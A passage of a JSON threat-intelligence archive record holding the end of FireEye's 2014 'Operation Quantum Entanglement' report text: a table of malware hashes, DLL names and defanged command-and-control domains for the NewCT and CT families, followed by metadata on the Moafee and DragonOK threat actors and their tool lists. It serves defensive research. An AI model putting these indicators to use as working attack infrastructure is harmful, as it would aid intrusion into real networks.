038e3cb5ff10b4d2|MSSoap.DLL|http.jpaols[.] com|hc_NewCT|\n|989d04ab23385260 a402ce7b6751e60e|NewCT2|81998ee8b8f8304d 038e3cb5ff10b4d2|MSSoap.DLL|facebook. pktmedia[.]com facebook. skyppee[.]com|face_NewCT|\n|6de67d5bfe61fbdc 2febfd289e9660c3|NewCT2|81998ee8b8f8304d 038e3cb5ff10b4d2|MSSoap.DLL|http.jpaols[.] com|jp80_NewCT|\n|908d847fd39a2851 85b3f0e8dc874dad|NewCT2|81998ee8b8f8304d 038e3cb5ff10b4d2|MSSoap.DLL|sslc.moafee[.] com|sslc_NewCT|\n|26a48ee15b8f976d b35e219428e05ef3|NewCT2|81998ee8b8f8304d 038e3cb5ff10b4d2|MSSoap.DLL|http.jpaols[.] com|jp80_NewCT|\n|bd5ed9168632e6da a6bcee6b6c48d60f|NewCT2|81998ee8b8f8304d 038e3cb5ff10b4d2|BurnDCSrv. DLL|butitistrun. blogdns[.]com|lcl918_NewCT|\n|46ac122183c32858 581e95ef40bd31b3|CT V2.1|81998ee8b8f8304d 038e3cb5ff10b4d2|IntelAMTPP. dll|ct.datangcun[.] com|20120509_CT V2.1|\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n###### Appendix C: Moafee and DragonOK Clusters\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n###### About FireEye, Inc.\nFireEye has invented a purpose-built, virtual\nmachine-based security platform that provides\nreal-time threat protection to enterprises and\ngovernments worldwide against the next\ngeneration of cyber attacks. These highly\nsophisticated cyber attacks easily circumvent\ntraditional signature-based defenses, such as\nnext-generation firewalls, IPS, anti-virus, and\ngateways. The FireEye Threat Prevention Platform\n\n\nprovides real-time, dynamic threat protection\nwithout the use of signatures to protect an\norganization across the primary threat vectors and\nacross the different stages of an attack life cycle.\nThe core of the FireEye platform is a virtual\nexecution engine, complemented by dynamic threat\nintelligence, to identify and block cyber attacks in\nreal time. FireEye has over 1,900 customers across\nmore than 60 countries, including over 130 of the\nFortune 500.\n\n\nFireEye, Inc. | 1440 McCarthy Blvd. Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com\n\n© 2014 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye,\nI All th b d d t i b t d k i\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/qvuhc7j8tle0a83z3iivsz3yz6aok3tv",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.09.10.Operation_Quantum_Entanglement/fireeye-operation-quantum-entanglement.pdf"
    ],
    "report_names": [
        "fireeye-operation-quantum-entanglement"
    ],
    "threat_actors": [
        {
            "id": "d7226f71-df4a-405e-9252-f8c4108303ae",
            "created_at": "2022-10-25T15:50:23.325171Z",
            "updated_at": "2025-03-27T02:00:55.442519Z",
            "deleted_at": null,
            "main_name": "Moafee",
            "aliases": [
                "Moafee"
            ],
            "source_name": "MITRE:Moafee",
            "tools": [
                "PoisonIvy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5ffe400c-6025-44c2-9aa1-7c34a7a192b0",
            "created_at": "2023-01-06T13:46:38.469688Z",
            "updated_at": "2025-03-27T02:00:02.84172Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "Moafee",
                "BRONZE OVERBROOK",
                "G0017",
                "G0002",
                "Shallow Taurus"
            ],
            "source_name": "MISPGALAXY:DragonOK",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7ebda3c6-1789-4d84-97cf-47fb18a0cb28",
            "created_at": "2022-10-25T15:50:23.78829Z",
            "updated_at": "2025-03-27T02:00:55.547275Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "DragonOK"
            ],
            "source_name": "MITRE:DragonOK",
            "tools": [
                "PoisonIvy",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "60d9c778-488b-459e-a2f6-9e48c607ba45",
            "created_at": "2022-10-25T16:47:55.606462Z",
            "updated_at": "2025-03-27T02:05:17.281676Z",
            "deleted_at": null,
            "main_name": "BRONZE OVERBROOK",
            "aliases": [
                "DragonOK ",
                "Samurai Panda ",
                "Temp.DragonOK ",
                "Danti "
            ],
            "source_name": "Secureworks:BRONZE OVERBROOK",
            "tools": [
                " DDKONG",
                " HelloBridge",
                " IsSpace",
                " NFLog Trojan",
                " PLAINTEE",
                " PlugX",
                " Rambo",
                "Aveo"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "340d1673-0678-4e1f-8b75-30da2f65cc80",
            "created_at": "2022-10-25T16:07:23.552036Z",
            "updated_at": "2025-03-27T02:02:09.85925Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "Bronze Overbrook",
                "Shallow Taurus"
            ],
            "source_name": "ETDA:DragonOK",
            "tools": [
                "Agent.dhwf",
                "CT",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Gen:Trojan.Heur.PT",
                "HTran",
                "HUC Packet Transmit Tool",
                "HelloBridge",
                "IsSpace",
                "KHRAT",
                "Kaba",
                "Korplug",
                "Mongall",
                "NFlog",
                "NewCT",
                "NfLog RAT",
                "PlugX",
                "Poison Ivy",
                "Rambo",
                "RedDelta",
                "SPIVY",
                "Sogu",
                "SysGet",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "TidePool",
                "Xamtrav",
                "brebsd",
                "ffrat",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c3c08eb0-cced-43ab-b126-fbe0c39a0698",
            "created_at": "2022-10-25T16:07:23.872885Z",
            "updated_at": "2025-03-27T02:02:10.00467Z",
            "deleted_at": null,
            "main_name": "Moafee",
            "aliases": [],
            "source_name": "ETDA:Moafee",
            "tools": [
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "HTran",
                "HUC Packet Transmit Tool",
                "Mongall",
                "NFlog",
                "NewCT2",
                "Poison Ivy",
                "SPIVY",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041804,
    "ts_creation_date": 1410386196,
    "ts_modification_date": 1410386201,
    "files": {
        "pdf": "https://archive.orkl.eu/bf937bb2315901541521f00abce8d441d272da16.pdf",
        "text": "https://archive.orkl.eu/bf937bb2315901541521f00abce8d441d272da16.txt",
        "img": "https://archive.orkl.eu/bf937bb2315901541521f00abce8d441d272da16.jpg"
    }
}